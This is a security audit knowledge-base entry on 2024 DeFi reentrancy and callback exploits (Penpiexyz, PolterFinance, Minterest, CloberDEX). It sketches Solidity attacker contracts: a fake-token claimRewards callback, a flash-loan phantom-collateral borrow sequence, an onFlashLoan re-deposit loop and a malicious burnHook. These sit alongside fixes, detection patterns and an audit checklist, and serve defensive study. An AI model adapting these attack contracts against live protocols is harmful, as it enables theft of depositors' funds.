---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, fantom"
category: "reentrancy"
vulnerability_type: "cross_function_reentrancy, callback_reentrancy, flash_loan_reentrancy"

# Pattern Identity (Required)
root_cause_family: callback_reentrancy
pattern_key: cross_function_reentrancy | reward_harvest | reentrancy | fund_loss

# Interaction Scope
interaction_scope: cross_protocol

# Attack Vector Details
attack_type: "reentrancy"
affected_component: "reward_harvest, collateral_accounting, flash_loan_callback, strategy_callback"

# Technical Primitives
primitives:
  - "reentrancy"
  - "cross_function"
  - "callback"
  - "fake_token"
  - "claimRewards"
  - "batchHarvestMarketRewards"
  - "phantom_collateral"
  - "empty_market_manipulation"
  - "onFlashLoan"
  - "ERC3156"
  - "burnHook"
  - "strategy_callback"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.80
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "burn"
  - "deposit"
  - "burnHook"
  - "mintHook"
  - "flashLoan"
  - "reentrancy"
  - "onFlashLoan"
  - "claimRewards"
  - "nonReentrant"
  - "fakeSY.claimRewards"
  - "rewardToken.claimRewards"
  - "batchHarvestMarketRewards"
path_keys:
  - "fake_token_reward_harvesting_callback_reentrancy"
  - "empty_market_phantom_collateral_attack"
  - "erc_3156_flash_loan_callback_re_deposit_loop"
  - "strategy_callback_reentrancy_via_attacker_controlled_hook"

# Context Tags
tags:
  - "defi"
  - "reentrancy"
  - "cross-function"
  - "callback"
  - "fake-token"
  - "rewards"
  - "harvest"
  - "phantom-collateral"
  - "flash-loan"
  - "empty-market"
  - "strategy"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [PENPIE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-09/Penpiexyz_exp.sol` |
| [POLTER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-11/PolterFinance_exp.sol` |
| [MINTEREST-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-11/Minterest_exp.sol` |
| [CLOBER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-12/CloberDEX_exp.sol` |

---

# Reentrancy & Callback Exploitation Patterns (2024-2025)
## Overview

Reentrancy in 2024 has evolved beyond classic ETH transfer reentrancy. Modern exploits abuse protocol-specific callback mechanisms — reward harvesting hooks, flash loan callbacks (ERC-3156), and strategy burn hooks. These attacks exploit cross-function reentrancy where the callback enters a different function than the one that initiated the external call, bypassing single-function reentrancy guards. Combined losses from the four major 2024 reentrancy exploits exceed **$35M**.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `callback_reentrancy` |
| Pattern Key | `cross_function_reentrancy | reward_harvest | reentrancy | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `cross_protocol` |
| Chain(s) | ethereum, arbitrum, fantom |


## 1. Fake Token Reward Harvesting Callback Reentrancy

> **pathShape**: `callback-reentrant`

### Root Cause

When a protocol's batch reward harvesting function iterates over market pools and calls `rewardToken.claimRewards()` on each market's SY (Standardized Yield) token without reentrancy protection, an attacker can register a fake SY token whose `claimRewards()` callback re-enters the protocol to deposit/withdraw at stale exchange rates. The protocol processes the callback with intermediate (corrupted) state.

### Attack Scenario

1. Deploy a fake SY token contract with a malicious `claimRewards()` function
2. Register the fake SY in a valid Pendle market (through market creation)
3. Call `batchHarvestMarketRewards()` on the PendleStaking contract
4. When the staking contract calls `fakeSY.claimRewards()`, the callback fires
5. Inside callback: deposit → claim → withdraw at manipulated exchange rate
6. Function returns, staking contract continues iterating — state is inconsistent

### Vulnerable Pattern Examples

**Example 1: Penpiexyz — Fake SY Token claimRewards() Reentrancy ($27.3M, Sep 2024)** [Approx Vulnerability: CRITICAL] `@audit` [PENPIE-POC]

```solidity
// ❌ VULNERABLE: batchHarvestMarketRewards iterates markets calling claimRewards()
// No reentrancy guard — attacker's fake SY token controls execution during harvest

// Step 1: Deploy fake SY token with malicious claimRewards()
contract FakeSY {
    function claimRewards(address) external returns (uint256[] memory) {
        // @audit REENTRANCY POINT — called by PendleStaking during batch harvest
        // Inside this callback, attacker re-enters the protocol:

        // Deposit into PendleMarketDepositHelper at stale exchange rate
        PendleMarketDepositHelper.depositMarket(
            pool,
            address(this),
            flashLoanAmount  // @audit Uses flash-loaned tokens
        );

        // Claim rewards — receives inflated share of existing rewards
        PenpieStaking.multiclaim(
            stakingTokens   // @audit Claims rewards for ALL pools
        );

        // Withdraw — extracts deposited tokens at stale rate
        PenpieStaking.withdraw(pool, depositedAmount);
        // @audit Net profit: rewards + rate difference

        return new uint256[](0);
    }
}

// PendleStaking.batchHarvestMarketRewards():
function batchHarvestMarketRewards(address[] memory markets) external {
    for (uint i = 0; i < markets.length; i++) {
        IStandardizedYield sy = IStandardizedYield(markets[i].SY);
        sy.claimRewards(address(this));
        // @audit External call to UNVERIFIED SY token
        // @audit No nonReentrant modifier on this function
        // @audit State updates happen AFTER the loop
    }
    _updateRewardDistribution();  // @audit Too late — attacker already claimed
}
// @audit $27.3M drained via reentrancy during reward harvest
```

---

## 2. Empty Market Phantom Collateral Attack

> **pathShape**: `atomic`

### Root Cause

In lending protocols, when a market is empty (no existing deposits), the first depositor sets the initial exchange rate. If the protocol doesn't enforce minimum deposits or uses a flash-loan-compatible collateral token, an attacker can: (1) flash loan → deposit 1 token → become the sole depositor → borrow against manipulated collateral value → repay the original deposit → the borrowed amount remains as phantom debt backed by nothing.

### Attack Scenario

1. Flash loan SpookyV2 LP tokens
2. Deposit exactly 1e18 into the empty PolterFinance lending pool
3. As sole depositor with no price competition, the collateral value is dictated by oracle
4. Borrow maximum against all other markets (BOO, WFTM, USDC, etc.)
5. Withdraw original deposit — borrowed funds remain with no backing
6. Repeat across 8+ empty markets in one transaction

### Vulnerable Pattern Examples

**Example 2: PolterFinance — Empty Market Phantom Collateral ($7M, Nov 2024)** [Approx Vulnerability: CRITICAL] `@audit` [POLTER-POC]

```solidity
// ❌ VULNERABLE: No minimum deposit, empty market allows exchange rate manipulation
// Single depositor can borrow against inflated collateral, withdraw, keep borrows

// Step 1: Flash loan exactly 1e18 SpookyV2 LP token
ISpookyV2.flashLoan(
    address(this),
    1e18,  // @audit Tiny amount — just needs to set initial exchange rate
    ""
);

// Step 2: Deposit into empty PolterFinance market
SpookyLP.approve(address(PolterFinance), 1e18);
PolterFinance.deposit(SpookyLP_Market, 1e18);
// @audit Market was empty — attacker is sole depositor
// @audit Exchange rate is now set by this single deposit

// Step 3: Borrow maximum from ALL other markets
PolterFinance.borrow(BOO_Market, BOO.balanceOf(address(PolterFinance)));
// @audit Borrow ALL of: BOO, WFTM, MIM, USDC, scUSD, axlUSDC, lzUSDC, USDT
// @audit Collateral "value" of 1e18 SpookyLP is enough because market is empty
for (uint i = 0; i < 8; i++) {
    PolterFinance.borrow(markets[i], maxBorrow[i]);
}

// Step 4: Withdraw deposit — debt remains with no collateral
PolterFinance.withdraw(SpookyLP_Market, 1e18);
// @audit Protocol doesn't block withdrawal — health check skipped for empty markets
// @audit PHANTOM DEBT: borrows exist with zero backing collateral
// @audit $7M drained across 8 markets on Fantom
```

---

## 3. ERC-3156 Flash Loan Callback Re-deposit Loop

> **pathShape**: `callback-reentrant`

### Root Cause

ERC-3156 flash loans include an `onFlashLoan()` callback to the borrower. If the lending protocol that issues the flash loan doesn't apply reentrancy guards on deposit functions during the callback, the borrower can re-deposit the flash-loaned tokens during the callback, creating a leverage loop. Each deposit inflates the attacker's collateral position, enabling massive borrowing.

### Attack Scenario

1. Request ERC-3156 flash loan from lending protocol
2. In `onFlashLoan()` callback: deposit the loaned tokens as collateral
3. Borrow against the new collateral → deposit again → borrow again
4. Repeat 20-30 times, pyramiding collateral
5. Final borrow: extract maximum value → repay flash loan

### Vulnerable Pattern Examples

**Example 3: Minterest — ERC-3156 onFlashLoan Callback Re-deposit Loop (427 ETH, Nov 2024)** [Approx Vulnerability: HIGH] `@audit` [MINTEREST-POC]

```solidity
// ❌ VULNERABLE: Lending protocol's deposit() is callable during flash loan callback
// onFlashLoan() re-enters deposit, creating leveraged position in one transaction

uint256 loopCount = 0;
uint256 constant MAX_LOOPS = 24;

function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    // @audit This callback is called BY the lending protocol during flashLoan()
    // @audit deposit() has no reentrancy guard against flash loan callbacks

    if (loopCount < MAX_LOOPS) {
        loopCount++;

        // Re-deposit flash-loaned RUSDY as collateral
        RUSDY.approve(address(MinterestLending), amount);
        MinterestLending.lendRUSDY(amount);
        // @audit Collateral position inflated — deposit DURING flash loan

        // Borrow against new collateral
        MinterestLending.borrow(amount * 95 / 100);

        // Request another flash loan to loop again
        MinterestLending.flashLoan(
            address(this),
            address(RUSDY),
            amount * 95 / 100,
            ""
        );
        // @audit Recursive: 24 loops = 24x leverage on original deposit
    }

    // Approve repayment
    RUSDY.approve(msg.sender, amount + fee);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
    // @audit After 24 loops: attacker has massive collateral + borrows
    // @audit Withdraw excess collateral after loop → net profit: 427 ETH
}
```

---

## 4. Strategy Callback Reentrancy via Attacker-Controlled Hook

> **pathShape**: `callback-reentrant`

### Root Cause

DEX protocols with customizable strategies allow liquidity providers to register callback hooks (e.g., `burnHook`, `mintHook`) that execute when positions are modified. If the hook contract is attacker-controlled and calls back into the DEX during execution, it can manipulate prices or amounts between the hook call and the final state update.

### Attack Scenario

1. Deploy a malicious strategy contract that implements `burnHook()`
2. Add liquidity to a DEX pool using the malicious strategy
3. Trigger a burn/removal that calls `burnHook()` on the attacker's contract
4. Inside `burnHook()`: manipulate pool state, swap tokens at stale price
5. When control returns, the pool finalizes at the corrupted intermediate state

### Vulnerable Pattern Examples

**Example 4: CloberDEX — Attacker-Controlled burnHook() Reentrancy ($501K, Dec 2024)** [Approx Vulnerability: HIGH] `@audit` [CLOBER-POC]

```solidity
// ❌ VULNERABLE: burnHook() calls attacker-controlled strategy contract
// Attacker re-enters DEX during burn to manipulate pool state

contract MaliciousStrategy is IStrategy {
    bool private reentered;

    function burnHook(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        // @audit Called by CloberDEX pool during liquidity removal
        if (!reentered) {
            reentered = true;

            // Re-enter the DEX: swap at stale price
            CloberPool.swap(
                address(this),
                true,           // direction
                int256(amount0),
                sqrtPriceLimitX96,
                ""
            );
            // @audit Pool state is intermediate — getReserves() returns stale data
            // @audit Swap executes at manipulated price

            // Remove more liquidity — also at stale state
            CloberPool.burn(
                address(this),
                tickLower,
                tickUpper,
                liquidity,
                ""
            );
            // @audit Double-dipping: remove liquidity at stale + post-swap states
        }
    }
}

// CloberDEX Pool:
function burn(address to, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
    external
{
    // Calculate amounts based on current state
    (uint256 amount0, uint256 amount1) = _calculateBurnAmounts(tickLower, tickUpper, amount);

    // @audit External call to strategy BEFORE state is fully updated
    IStrategy(strategy).burnHook(msg.sender, amount0, amount1, data);

    // State update happens AFTER callback
    _updatePosition(tickLower, tickUpper, -int128(amount));
    // @audit CEI violation: Callback before state update enables reentrancy
}
// @audit $501K drained via price manipulation during strategy callback
```

---

## Impact Analysis

### Technical Impact
- Fake token callbacks bypass all input validation — protocol calls attacker's code
- Empty market manipulation requires zero code vulnerabilities — purely economic attack
- Flash loan callback loops achieve 20-30x leverage in a single transaction
- Strategy hooks provide arbitrary code execution within pool state transitions
- Cross-function reentrancy bypasses single-function `nonReentrant` modifiers

### Business Impact
- **Penpiexyz**: $27.3M lost — fake SY token reentrancy during batch reward harvest
- **PolterFinance**: $7M lost — phantom collateral from empty market manipulation
- **Minterest**: ~$750K (427 ETH) — ERC-3156 callback re-deposit leverage loop
- **CloberDEX**: $501K — attacker-controlled burnHook() reentrancy
- Combined 2024 reentrancy damage: **$35M+**

### Affected Scenarios
- Reward harvesting/distribution systems iterating over external token calls
- Lending protocols with flash loans and no deposit guards during callbacks
- DEX protocols with customizable strategy/hook contracts
- Any protocol that accepts user-registered tokens or strategy contracts
- Multi-market lending platforms with empty market creation

---

## Secure Implementation

**Fix 1: Validate SY Tokens in Registry + Reentrancy Guard on Batch Harvest**
```solidity
// ✅ SECURE: Whitelist SY tokens and apply reentrancy guard
mapping(address => bool) public approvedSYTokens;

function batchHarvestMarketRewards(address[] memory markets) external nonReentrant {
    for (uint i = 0; i < markets.length; i++) {
        address sy = IMarket(markets[i]).SY();
        require(approvedSYTokens[sy], "Unapproved SY token");
        // @audit Only whitelisted tokens can be harvested
        IStandardizedYield(sy).claimRewards(address(this));
    }
    _updateRewardDistribution();
}
```

**Fix 2: Enforce Minimum Deposit and Collateral Factor Limits**
```solidity
// ✅ SECURE: Minimum deposit + collateral ceiling for new markets
uint256 constant MIN_INITIAL_DEPOSIT = 1000e18;

function deposit(address market, uint256 amount) external {
    MarketInfo storage info = markets[market];
    if (info.totalDeposits == 0) {
        require(amount >= MIN_INITIAL_DEPOSIT, "Below minimum for new market");
        // @audit Prevents single-token phantom collateral manipulation
    }
    info.totalDeposits += amount;
    // ...
}
```

**Fix 3: Block Deposits During Flash Loan Callbacks**
```solidity
// ✅ SECURE: Flag active flash loans and block deposits
mapping(address => bool) private _activeFlashLoan;

function flashLoan(address receiver, address token, uint256 amount, bytes calldata data)
    external nonReentrant
{
    _activeFlashLoan[receiver] = true;
    // ... transfer tokens, call onFlashLoan ...
    _activeFlashLoan[receiver] = false;
}

function deposit(address token, uint256 amount) external {
    require(!_activeFlashLoan[msg.sender], "No deposits during flash loan");
    // @audit Prevents callback re-deposit loops
    // ...
}
```

**Fix 4: Checks-Effects-Interactions for Strategy Hooks**
```solidity
// ✅ SECURE: Update state BEFORE calling strategy hook
function burn(address to, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
    external nonReentrant  // @audit Add reentrancy guard
{
    (uint256 amount0, uint256 amount1) = _calculateBurnAmounts(tickLower, tickUpper, amount);

    // @audit Effects BEFORE interactions (CEI pattern)
    _updatePosition(tickLower, tickUpper, -int128(amount));

    // Now safe to call external hook
    IStrategy(strategy).burnHook(msg.sender, amount0, amount1, data);

    // Transfer tokens last
    _transferOut(to, amount0, amount1);
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: for-loop with external call to user-registered/unverified token
- Pattern 2: claimRewards() / harvest() iterating over dynamic token list
- Pattern 3: Lending deposit() callable during onFlashLoan() callback
- Pattern 4: Strategy/hook pattern: external call before state update (CEI violation)
- Pattern 5: Empty market with no minimum deposit requirement
- Pattern 6: nonReentrant on function A but not on function B that A calls into
```

### Audit Checklist
- [ ] Does batch harvesting iterate over user-registered tokens with external calls?
- [ ] Are SY/reward tokens whitelisted or can anyone register arbitrary tokens?
- [ ] Can `deposit()` be called during a flash loan callback to the same protocol?
- [ ] Does the protocol follow CEI (Checks-Effects-Interactions) for all hook callbacks?
- [ ] Are strategy/hook contracts restricted to whitelisted implementations?
- [ ] Is there a minimum deposit enforced for new/empty markets?
- [ ] Are all entry points protected by the same reentrancy lock?
- [ ] Can flash-loaned tokens be used as collateral in the same protocol?

---

## Real-World Examples

### Known Exploits
- **Penpiexyz** — $27.3M — Fake SY token claimRewards() callback reentrancy during batch harvest — Sep 2024
- **PolterFinance** — $7M — Empty market phantom collateral via flash loan (Fantom) — Nov 2024
- **Minterest** — 427 ETH — ERC-3156 onFlashLoan callback re-deposit loop (24× leverage) — Nov 2024
- **CloberDEX** — $501K — Attacker-controlled burnHook() strategy callback reentrancy — Dec 2024

---

## Prevention Guidelines

### Development Best Practices
1. Apply `nonReentrant` to ALL external-facing functions, not just the primary entry points
2. Never iterate over user-registered token addresses with external calls
3. Whitelist all token/strategy contracts that receive callbacks
4. Follow Checks-Effects-Interactions (CEI) strictly for all hook/callback patterns
5. Block deposits/borrows during active flash loan callbacks
6. Enforce minimum initial deposits for new markets (prevent empty market manipulation)
7. Use a global reentrancy lock (OpenZeppelin ReentrancyGuard) shared across all functions
8. Consider `transient storage` (EIP-1153) for gas-efficient reentrancy locks on newer EVM versions

### Testing Requirements
- Integration test: deploy fake token, register in protocol, trigger batch harvest
- Reentrancy test: attempt `deposit()` inside `onFlashLoan()` callback
- Invariant test: `totalDeposits >= totalBorrows` must hold across reentrancy
- Fuzz test: random sequence of {deposit, borrow, withdraw, flashLoan} with callback contracts
- Empty market test: first depositor cannot borrow more than proportional collateral value

---

## Keywords for Search

`reentrancy`, `callback reentrancy`, `cross-function reentrancy`, `claimRewards`, `batchHarvestMarketRewards`, `fake SY token`, `fake token callback`, `onFlashLoan reentrancy`, `ERC3156 callback`, `re-deposit loop`, `flash loan leverage`, `burnHook`, `mintHook`, `strategy callback`, `hook reentrancy`, `empty market`, `phantom collateral`, `first depositor attack`, `CEI violation`, `nonReentrant`, `reentrancy guard`, `cross-function lock`, `reward harvest reentrancy`, `deposit during callback`, `transient storage reentrancy`

---

## Related Vulnerabilities

- `DB/general/reentrancy/defihacklabs-reentrancy-patterns.md` — Earlier reentrancy patterns (2021-2023)
- `DB/general/flash-loan/defihacklabs-flash-loan-patterns.md` — Flash loan attack patterns
- `DB/general/vault-inflation-attack/defihacklabs-vault-inflation-patterns.md` — Related empty market inflation
- `DB/general/precision/defihacklabs-precision-share-manipulation-2024-2025.md` — Related share manipulation
